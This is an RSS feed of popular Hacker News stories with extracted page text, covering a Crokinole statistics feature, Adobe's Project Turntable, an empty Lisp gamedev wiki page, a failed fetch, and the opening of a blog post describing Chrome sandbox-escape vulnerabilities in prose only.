<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Thu, 17 Oct 2024 19:30:02 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Crokinole (192 pts)]]></title>
            <link>https://pudding.cool/2024/10/crokinole/</link>
            <guid>41871375</guid>
            <pubDate>Thu, 17 Oct 2024 16:54:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://pudding.cool/2024/10/crokinole/">https://pudding.cool/2024/10/crokinole/</a>, See on <a href="https://news.ycombinator.com/item?id=41871375">Hacker News</a></p>
<div id="readability-page-1" class="page"><section id="story">    <p><!-- HTML_TAG_START -->What you’re seeing below is two of Crokinole’s greats simultaneously securing perfect rounds.<!-- HTML_TAG_END --></p>  <figure><video src="https://pudding.cool/2024/10/crokinole/assets/videos/perfect.mp4" poster="https://pudding.cool/2024/10/crokinole/assets/images/perfect.jpg" preload="true" autoplay="" loop="" muted="" playsinline=""></video>  <figcaption><!-- HTML_TAG_START -->Double perfect round. Watch on <a href="https://www.youtube.com/watch?v=wVuA3B4zR7Q" target="_blank" rel="noreferrer">YouTube</a>.<!-- HTML_TAG_END --></figcaption> </figure>  <p><!-- HTML_TAG_START -->Technically speaking, they each flicked a 3.2cm disc 30cm across a board into a 3.5cm hole (just 9% wider than the disc itself) eight times in a row. In game terms, they made eight open 20s each.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START --><strong>But it’s just flicking a little disc across a small board. How hard can it be, really?</strong><!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->The mesmerizing 56 seconds above were captured at the semifinals of the 2024 World Crokinole Championship, where Connor Reinman defeated Jason Slater. A matchup not unlike Magic vs. Bird, or Swift vs. Eilish.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->How rare was this feat of perfection? Was this one of those obscure new Olympic events? You may even be wondering, wtf is Crokinole?<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->We’ll get to all these questions. <strong>But first, you must understand Crokinole.</strong><!-- HTML_TAG_END --></p>  <figure><img src="https://pudding.cool/2024/10/crokinole/assets/images/ontario.jpg" alt="Map highlighting the southern region of Ontario"> <figcaption><!-- HTML_TAG_START -->The game’s origin: the southern region of Ontario.<!-- HTML_TAG_END --></figcaption> </figure>  <p><!-- HTML_TAG_START -->If you are from the southern region of the Canadian province of Ontario, you may already be well-versed in Crokinole due to its <a href="https://www.canadashistory.ca/explore/arts-culture-society/crokinole" target="_blank" rel="no_referrer">Canadian origin.</a> For the uninitiated, Crokinole is like a mashup of shuffleboard and curling, played on a tabletop board. It’s been around since the 19th century but has seen a steady rise in global popularity in recent years.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->To know the game, one must play the game. <br><strong>Let your training begin.</strong><!-- HTML_TAG_END --></p>  <div><div> <p><!-- HTML_TAG_START -->The main objective is to flick your discs into higher-scoring regions. <strong>The center hole is worth 20 points.</strong> Be careful, though—eight pegs surround the fifteen-point region.<!-- HTML_TAG_END --></p> <p><!-- HTML_TAG_START -->Here, <span>your opponent</span> shoots on an empty board. To be a valid shot (and stay on the board) the disc must land within the <span>15-point region.</span><!-- HTML_TAG_END --></p> <p><!-- HTML_TAG_START -->If any <span>opponent discs</span> are on the board, <span>your disc</span> must hit one to be valid and stay on the board.<!-- HTML_TAG_END --></p> <p><!-- HTML_TAG_START --><strong>Give it a try:</strong> Hit your <span>opponent’s disc.</span> Use the <strong>slider and button</strong> below the board to position your disc. Then aim, hold the shoot button to find the perfect power, and release.<!-- HTML_TAG_END --></p> <p><!-- HTML_TAG_START -->If you shoot and it is an invalid shot, <span>your disc</span> is removed from the board and is not scored.<!-- HTML_TAG_END --></p> <p><!-- HTML_TAG_START -->It’s your turn, and there are <span>no opponent discs</span>. You just need to land in the fifteen-point region, <strong>but scoring a 20 is ideal.</strong> A made 20 is set aside and counted.<!-- HTML_TAG_END --></p> <p><!-- HTML_TAG_START --><strong>Give it a try:</strong> Shoot <span>your disc</span> into the center hole to secure the 20 points.<!-- HTML_TAG_END --></p> <p><!-- HTML_TAG_START -->After all sixteen discs are played, points are tallied based on the regions and any 20s. The round winner is the player with the most points, and a game consists of multiple rounds.<!-- HTML_TAG_END --></p></div> <figure></figure> </div>  <figure><video src="https://pudding.cool/2024/10/crokinole/assets/videos/keanu.mp4" poster="https://pudding.cool/2024/10/crokinole/assets/images/keanu.jpg" preload="true" autoplay="" loop="" muted="" playsinline=""></video>   </figure>  <p><!-- HTML_TAG_START -->Easy Keanu, that was just the basics. We didn’t even get to the one-cheek rule (yes, that cheek). For more details you can <a href="https://youtu.be/R-6hdqdYPpE" target="_blank" rel="noreferrer">watch this video</a> or <a href="http://nationalcrokinoleassociation.com/resources/rules.html" target="_blank" rel="noreferrer">read the rules</a>.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->Oh, and feel free to go play—we made <a href="https://pudding.cool/2024/10/crokinole/play">a simulator</a> for you to hone your skills against a bot.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->You are ready for the next part of the journey. <strong>What does the data tell us about Connor Reinman and Jason Slater?</strong><!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->Reinman, the back-to-back world champion, and Slater, the perennial powerhouse, are arguably the greatest players right now on the world stage.<!-- HTML_TAG_END --></p>  <figure><img src="https://pudding.cool/2024/10/crokinole/assets/images/bump.png" alt="Bump chart of player rankings over the past 10 years"> <figcaption><!-- HTML_TAG_START -->Player rankings according to <a href="http://crokinolereference.com/" target="_blank" rel="noreferrer"> Crokinole Reference.</a> No matches from 2021-2022.<!-- HTML_TAG_END --></figcaption> </figure>  <p><!-- HTML_TAG_START -->But how good are they? Let’s start by looking at their ability to make open 20s, an indispensable skill for success. <strong>Here’s how competitive players compare in open 20 success rates.</strong><!-- HTML_TAG_END --></p>    <div><table> <thead><tr> <th>Player</th> <th>Attempts</th> <th>Percent Made</th></tr></thead> <tbody> <tr> <td><!-- HTML_TAG_START -->Justin Slater<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->594<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->75.6%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Josh Carrafiello<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->334<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->68.0%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Connor Reinman<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->703<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->66.0%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Andrew Hutchinson<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->619<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->65.9%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Ron Langill<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->108<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->65.7%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Travis Keener<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->63<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->65.1%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Robert Bonnett<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->74<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->62.2%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Darren Carr<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->103<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->62.1%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Jason Beierling<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->184<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->57.6%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Ray Beierling<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->302<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->57.3%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Nolan Tracey<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->95<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->56.8%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Nathan Walsh<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->164<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->55.5%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Jeremy Tracey<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->184<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->49.5%<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Jon Conrad<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->69<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->43.5%<!-- HTML_TAG_END --></td> </tr></tbody></table> <p><em>Note: <!-- HTML_TAG_START -->Minimum 50 attempts from the 2023-2024 season.<!-- HTML_TAG_END --></em></p> </div>  <p><!-- HTML_TAG_START -->Reinman and Slater are top competitors in open 20s, with success rates of 66% and 75%, compared to the average competitive player’s 55%.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->For basketball fans: a Crokinole player making eight consecutive 20s in live play is like an NBA player sinking 20 straight free throws during a game—not impossible, but far from common.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->How do they compare to casual players? Observing players with varying experience, success rates for in-game open 20s ranged from 20% to 50%.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->The odds of two opponents making eight consecutive shots can vary greatly depending on their skill level. <strong>Here are the odds of a double perfect round.</strong><!-- HTML_TAG_END --></p>  <div><table> <thead><tr> <th>Type of Players</th> <th>Open 20 Pct.</th> <th>Odds</th></tr></thead> <tbody> <tr> <td><!-- HTML_TAG_START -->Slater vs Reinman<sup>*</sup><!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->~70%<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->1 in 277 rounds<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Top Competitive<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->65%<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->1 in 985<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Average Competitive<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->55%<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->1 in 14,263<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Great Recreational<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->50%<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->1 in 65,536<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Good Recreational<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->45%<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->1 in 353,671<!-- HTML_TAG_END --></td> </tr> <tr> <td><!-- HTML_TAG_START -->Novice Recreational<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->35%<!-- HTML_TAG_END --></td> <td><!-- HTML_TAG_START -->1 in 19,720,199<!-- HTML_TAG_END --></td> </tr></tbody></table> <p><em>Note: <!-- HTML_TAG_START -->Slater makes 75% and Reinman makes 66% on open 20s.<!-- HTML_TAG_END --></em></p> </div>  <p><!-- HTML_TAG_START -->Our theoretical scenarios show how even a slight drop in skill greatly impacts the odds. To witness this rare event, both top players must hit a hot streak at the same time.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->These percentages reflect in-game attempts, where a player’s rhythm is disrupted by various shots. In non-competitive, less plamigerent settings, their skills really shine—like Shawn Hagarty, who set an unofficial record with 64 consecutive open 20s.<!-- HTML_TAG_END --></p>  <figure><video src="https://pudding.cool/2024/10/crokinole/assets/videos/record.mp4" poster="https://pudding.cool/2024/10/crokinole/assets/images/record.jpg" preload="true" autoplay="" loop="" muted="" playsinline=""></video>  <figcaption><!-- HTML_TAG_START -->64 straight open 20s by Shaw Hagarty. Watch on <a href="https://www.youtube.com/watch?v=Lmp_-1ifOPc" target="_blank" rel="noreferrer">YouTube</a>.<!-- HTML_TAG_END --></figcaption> </figure>  <p><!-- HTML_TAG_START -->However, real games are far more nuanced and complex. Players — or their opponents — often miss early on. Here’s what the data reveals after analyzing 300 rounds from various matchups in last season’s tournaments.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START --><strong>At Which Shot an Open 20 is First Missed in Competitive Matches</strong><!-- HTML_TAG_END --></p>  <div><div> <p><strong>Double perfect round</strong> <br>
				No misses<br>↓</p></div> <p><em>Note: <!-- HTML_TAG_START -->Based on 300 rounds from final to quarterfinal matches in the past year.<!-- HTML_TAG_END --></em></p> </div>  <p><!-- HTML_TAG_START -->More often than not, the elusive double perfect round is lost right at the start. But I’ve been discussing this in the context of the most elegant form — a “pure” double perfect round, where all 16 shots are made as open 20s.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->Technically, though, a miss doesn’t completely rule out a perfect round. A perfect round can (and often does) include a combination of open 20s and ricochet 20s, where a disc bounces in off the opponent’s.<!-- HTML_TAG_END --></p>  <figure><video src="https://pudding.cool/2024/10/crokinole/assets/videos/ricochet.mp4" poster="https://pudding.cool/2024/10/crokinole/assets/images/ricochet.jpg" preload="true" autoplay="" loop="" muted="" playsinline=""></video>  <figcaption><!-- HTML_TAG_START -->Ricochet 20s by Justin Slater and Andrew Hutchinson. Watch on <a href="https://www.youtube.com/watch?v=Iyn64Sn_yqI" target="_blank" rel="noreferrer">YouTube</a>.<!-- HTML_TAG_END --></figcaption> </figure>  <p><!-- HTML_TAG_START -->The perfect blend of aim and power is required to perfect shots like those. Try it yourself: can you achieve the feel-good ricochet 20?<!-- HTML_TAG_END --></p>    <p><!-- HTML_TAG_START -->Going for a 20 isn’t always the best or even a viable option. Discs on the board introduce more exciting scenarios that add layers of strategy.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->Having all your discs on your side is usually a strong defensive position, but watching your opponent dismantle it can be demoralizing. That’s exactly what happened in this round between Andrew Hutchinson and Nolan Tracey.<!-- HTML_TAG_END --></p>  <figure><video src="https://pudding.cool/2024/10/crokinole/assets/videos/triple.mp4" poster="https://pudding.cool/2024/10/crokinole/assets/images/triple.jpg" preload="true" autoplay="" loop="" muted="" playsinline=""></video>  <figcaption><!-- HTML_TAG_START -->Triple takeout by Nolan Tracey. Watch on <a href="https://www.youtube.com/watch?v=B3zaxfzEfXc" target="_blank" rel="noreferrer">YouTube</a>.<!-- HTML_TAG_END --></figcaption> </figure>  <p><!-- HTML_TAG_START -->The Slater-Reinman round was the only double perfect in a review of 445 highly competitive rounds in the past year. One thing is certain: more skilled players tend to keep the board clear and make open 20s at a higher rate, increasing the chance of glimpsing a pure double perfect round.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START -->If there’s one takeaway, it’s that Crokinole is fun and the community is awesome. Whether you’re playing to win or just flicking a few rounds with Grandma during the holidays, it’s a great time.<!-- HTML_TAG_END --></p>  <p><!-- HTML_TAG_START --><strong>So, maybe you’re into Crokinole now?</strong> Here are some resources to help you get started, or go get some practice in with <a href="https://pudding.cool/2024/10/crokinole/play">the simulator</a>.<!-- HTML_TAG_END --></p>  <ul><li><!-- HTML_TAG_START --><a href="http://nationalcrokinoleassociation.com/clubs.html" target="_blank" rel="noreferrer">Find</a> a <a href="https://traceyboards.com/crokinole-connections-map/" target="_blank" rel="noreferrer">club</a><!-- HTML_TAG_END --></li><li><!-- HTML_TAG_START -->Buy a board <a href="https://traceyboards.com/" target="_blank" rel="noreferrer">here</a> (or <a href="https://muzzies.ca/" target="_blank" rel="noreferrer">here</a>, <a href="https://www.browncastlegames.com/" target="_blank" rel="noreferrer">here</a>, <a href="https://crokinole.ca/" target="_blank" rel="noreferrer">here</a>)<!-- HTML_TAG_END --></li><li><!-- HTML_TAG_START --><a href="https://www.youtube.com/@TraceyBoardsWatch" target="_blank" rel="noreferrer">Watch some matches</a><!-- HTML_TAG_END --></li><li><!-- HTML_TAG_START --><a href="https://www.youtube.com/watch?v=qyH7o1FYkcU" target="_blank" rel="noreferrer">Listen</a> to some <a href="https://www.youtube.com/watch?v=OF3JfiexLVA" target="_blank" rel="noreferrer">jams</a><!-- HTML_TAG_END --></li><li><!-- HTML_TAG_START --><a href="https://www.reddit.com/r/Crokinole/" target="_blank" rel="noreferrer">/r/Crokinole</a><!-- HTML_TAG_END --></li> </ul>  <p><!-- HTML_TAG_START -->P.S. Crokinole isn’t an Olympic sport — yet.<!-- HTML_TAG_END --></p>  <div id="method"><p><!-- HTML_TAG_START --><strong>Data and Methods</strong><!-- HTML_TAG_END --></p><p><!-- HTML_TAG_START -->Player types are estimations based on all open 20 success rates from 2023-2024 NCA tournament data. Competitive 20 success rates are from <a href="https://public.tableau.com/app/profile/shawn.hagarty/viz/NCACrokinole20sStats/NCAAll20s" target="_blank" rel="noreferrer">Shawn Hagarty’s impressive data.</a> Recreational open 20 success rates are based on observations of 600 open 20 attempts from 10 individuals with at least 50 attempts each. First missed shot data is from watching playoff-rounds from all 2023-2024 tournaments on <a href="https://www.youtube.com/@TraceyBoards" target="_blank" rel="noreferrer">Tracey Boards coverage</a> of events. Yearly NCA tour rankings data is based on the rank in July (at the end of the season). Data from <a href="http://crokinolereference.com/" target="_blank" rel="noreferrer">Crokinole Reference.</a><!-- HTML_TAG_END --></p> </div> </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Adobe's new image rotation tool is one of the most impressive AI tools seen (467 pts)]]></title>
            <link>https://www.creativebloq.com/design/adobes-new-image-rotation-tool-is-one-of-the-most-impressive-ai-concepts-weve-seen</link>
            <guid>41870040</guid>
            <pubDate>Thu, 17 Oct 2024 14:31:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.creativebloq.com/design/adobes-new-image-rotation-tool-is-one-of-the-most-impressive-ai-concepts-weve-seen">https://www.creativebloq.com/design/adobes-new-image-rotation-tool-is-one-of-the-most-impressive-ai-concepts-weve-seen</a>, See on <a href="https://news.ycombinator.com/item?id=41870040">Hacker News</a></p>
<div id="readability-page-1" class="page"><section data-widget-type="contentparsed" id="content">
<div itemprop="image" itemscope="" itemtype="https://schema.org/ImageObject">
<div>
<picture data-new-v2-image="true">
<source type="image/webp" srcset="https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-320-80.jpg.webp 320w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-480-80.jpg.webp 480w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-650-80.jpg.webp 650w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-970-80.jpg.webp 970w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-1024-80.jpg.webp 1024w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-1200-80.jpg.webp 1200w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-1920-80.jpg.webp 1920w" sizes="(min-width: 1000px) 600px, calc(100vw - 40px)">
<img src="https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-320-80.jpg" alt="A vector image of a knight with a sword facing a dragon" srcset="https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-320-80.jpg 320w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-480-80.jpg 480w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-650-80.jpg 650w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-970-80.jpg 970w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-1024-80.jpg 1024w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-1200-80.jpg 1200w, https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y-1920-80.jpg 1920w" sizes="(min-width: 1000px) 600px, calc(100vw - 40px)" data-original-mos="https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y.jpg" data-pin-media="https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y.jpg" data-pin-nopin="true" fetchpriority="high">
</picture>
</div>
<meta itemprop="url" content="https://cdn.mos.cms.futurecdn.net/FrUYPzk3FiVjDdxZzuZp7Y.jpg">
<meta itemprop="height" content="600">
<meta itemprop="width" content="338">
<figcaption itemprop="caption description">
<span itemprop="copyrightHolder">(Image credit: Adobe)</span>
</figcaption>
</div>

<div id="article-body">
<p>While <a data-analytics-id="inline-link" href="https://www.creativebloq.com/tag/adobe" data-auto-tag-linker="true" data-before-rewrite-localise="https://www.creativebloq.com/tag/adobe">Adobe</a>'s annual MAX conference gives the company a chance to <a data-analytics-id="inline-link" href="https://www.creativebloq.com/art/digital-art/i-just-saw-an-adobe-max-demo-of-illustrators-new-ai-tool-and-now-i-want-to-get-back-into-vector-art" data-before-rewrite-localise="https://www.creativebloq.com/art/digital-art/i-just-saw-an-adobe-max-demo-of-illustrators-new-ai-tool-and-now-i-want-to-get-back-into-vector-art">unveil its latest features</a>, it also lets the brand demonstrate some of its more weird and wonderful ideas. 'Sneaks' sees Adobe engineers take to the stage to share ideas that may or may not see the light of day, such as 2024's Project Turntable. Creative Bloq enjoyed an exclusive preview of the concept in ahead of its unveiling at MAX, and it's one of the most impressive Sneaks we've seen.</p><p>Project Turntable<strong> </strong>lets users easily rotate 2D vector art in 3D, whilst ensuring it still look like 2D art from any new angle. And even after the rotation, the vector graphics stay true to the original shape, maintaining the design’s original essence.</p><div data-hydrate="true" id="slice-container-newsletterForm-articleInbodyContent-i4q48hK24nBygdBNx2tfjk"><section><p>Daily design news, reviews, how-tos and more, as picked by the editors.</p></section></div>
</div>
<div>
<p><img src="https://cdn.mos.cms.futurecdn.net/flexiimages/mcasa08ogs1651144853.svg"></p>
<div>
<p><strong><span>Thank you for reading 5 articles this month* Join now for unlimited access</span></strong></p><p><strong><span>Enjoy your first month for just £1 / $1 / €1</span></strong></p>
</div>

<p><span>*Read 5 free articles per month without a subscription</span></p>
</div>

<div>
<p><img src="https://cdn.mos.cms.futurecdn.net/flexiimages/mcasa08ogs1651144853.svg">
</p>
<div>
<p><strong><span>Join now for unlimited access</span></strong></p><p>Try first month for just <strong>£1 / $1 / €1</strong></p>
</div>

</div>

<div id="slice-container-authorBio-i4q48hK24nBygdBNx2tfjk"><p>Daniel John is Design Editor at Creative Bloq. He reports on the worlds of art, design, branding and lifestyle tech (which often translates to tech made by Apple). He joined in 2020 after working in copywriting and digital marketing with brands including ITV, NBC, Channel 4 and more.</p></div>


<div>
<h4>Related articles</h4>

</div>
</section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Gamedev in Lisp. Part 2: Dungeons and Interfaces (201 pts)]]></title>
            <link>https://gitlab.com/lockie/cl-fast-ecs/-/wikis/tutorial-2</link>
            <guid>41869460</guid>
            <pubDate>Thu, 17 Oct 2024 13:26:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://gitlab.com/lockie/cl-fast-ecs/-/wikis/tutorial-2">https://gitlab.com/lockie/cl-fast-ecs/-/wikis/tutorial-2</a>, See on <a href="https://news.ycombinator.com/item?id=41869460">Hacker News</a></p>
<div id="readability-page-1" class="page">




<header data-testid="navbar">
<a href="#content-body">Skip to content</a>
<div>
<nav aria-label="Explore GitLab">
<div>
<span>GitLab</span>
<a title="Homepage" id="logo" aria-label="Homepage" data-track-label="main_navigation" data-track-action="click_gitlab_logo_link" data-track-property="navigation_top" href="https://gitlab.com/"><svg aria-hidden="true" role="img" width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="m24.507 9.5-.034-.09L21.082.562a.896.896 0 0 0-1.694.091l-2.29 7.01H7.825L5.535.653a.898.898 0 0 0-1.694-.09L.451 9.411.416 9.5a6.297 6.297 0 0 0 2.09 7.278l.012.01.03.022 5.16 3.867 2.56 1.935 1.554 1.176a1.051 1.051 0 0 0 1.268 0l1.555-1.176 2.56-1.935 5.197-3.89.014-.01A6.297 6.297 0 0 0 24.507 9.5Z" fill="#E24329"></path>
  <path d="m24.507 9.5-.034-.09a11.44 11.44 0 0 0-4.56 2.051l-7.447 5.632 4.742 3.584 5.197-3.89.014-.01A6.297 6.297 0 0 0 24.507 9.5Z" fill="#FC6D26"></path>
  <path d="m7.707 20.677 2.56 1.935 1.555 1.176a1.051 1.051 0 0 0 1.268 0l1.555-1.176 2.56-1.935-4.743-3.584-4.755 3.584Z" fill="#FCA326"></path>
  <path d="M5.01 11.461a11.43 11.43 0 0 0-4.56-2.05L.416 9.5a6.297 6.297 0 0 0 2.09 7.278l.012.01.03.022 5.16 3.867 4.745-3.584-7.444-5.632Z" fill="#FC6D26"></path>
</svg>

</a></div>
<ul>
<li>

<div>
<ul>
<li>
<a href="https://about.gitlab.com/why-gitlab">Why GitLab
</a></li>
<li>
<a href="https://about.gitlab.com/pricing">Pricing
</a></li>
<li>
<a href="https://about.gitlab.com/sales">Contact Sales
</a></li>
<li>
<a href="https://gitlab.com/explore">Explore</a>
</li>
</ul>
</div>
</li>
<li>
<a href="https://about.gitlab.com/why-gitlab">Why GitLab
</a></li>
<li>
<a href="https://about.gitlab.com/pricing">Pricing
</a></li>
<li>
<a href="https://about.gitlab.com/sales">Contact Sales
</a></li>
<li>
<a href="https://gitlab.com/explore">Explore</a>
</li>
</ul>
<ul>
<li>
<a href="https://gitlab.com/users/sign_in?redirect_to_referer=yes">Sign in</a>
</li>
<li>
<a href="https://gitlab.com/users/sign_up"><span>
Get free trial

</span>

</a></li>
</ul>
</nav>
</div>
</header>

<div>



<div data-testid="top-bar">
<div data-testid="breadcrumb-links" id="js-vue-page-breadcrumbs-wrapper">


</div>


</div>

<div>
<main id="content-body" itemscope="" itemtype="http://schema.org/SoftwareSourceCode">












</main>
</div>


</div>








</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Cats are (almost) liquid (158 pts)]]></title>
            <link>https://www.cell.com/iscience/fulltext/S2589-0042(24)02024-8</link>
            <guid>41868683</guid>
            <pubDate>Thu, 17 Oct 2024 11:43:00 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.cell.com/iscience/fulltext/S2589-0042(24)02024-8">https://www.cell.com/iscience/fulltext/S2589-0042(24)02024-8</a>, See on <a href="https://news.ycombinator.com/item?id=41868683">Hacker News</a></p>
Couldn't get https://www.cell.com/iscience/fulltext/S2589-0042(24)02024-8: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Escaping the Chrome Sandbox Through DevTools (349 pts)]]></title>
            <link>https://ading.dev/blog/posts/chrome_sandbox_escape.html</link>
            <guid>41866802</guid>
            <pubDate>Thu, 17 Oct 2024 05:55:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ading.dev/blog/posts/chrome_sandbox_escape.html">https://ading.dev/blog/posts/chrome_sandbox_escape.html</a>, See on <a href="https://news.ycombinator.com/item?id=41866802">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content_wrapper">
        
  
  <p><i>By ading2210 on 10/16/24</i></p>
  <h2>Introduction</h2>
<p>This blog post details how I found CVE-2024-6778 and CVE-2024-5836, which are vulnerabilities within the Chromium web browser which allowed for a sandbox escape from a browser extension (with a tiny bit of user interaction). Eventually, Google paid me $20,000 for this bug report. </p>
<p>In short, these bugs allowed a malicious Chrome extension to run any shell command on your PC, which might then be used to install some even worse malware. Instead of merely stealing your passwords and compromising your browser, an attacker could take control of your entire operating system. </p>
<h2>WebUIs and the Chrome Sandbox</h2>
<p>All untrusted code that Chromium runs is sandboxed, which means that it runs in an isolated environment that cannot access anything it's not supposed to. In practice, this means that the Javascript code that runs in a Chrome extension can only interact with itself and the Javascript APIs it has access to. Which APIs an extension has access to is dependent on the <a href="https://developer.chrome.com/docs/extensions/reference/permissions-list">permissions</a> that the user grants it. However, the worst that you can really do with these permissions is steal someone's logins and browser history. Everything is supposed to stay contained to within the browser.</p>
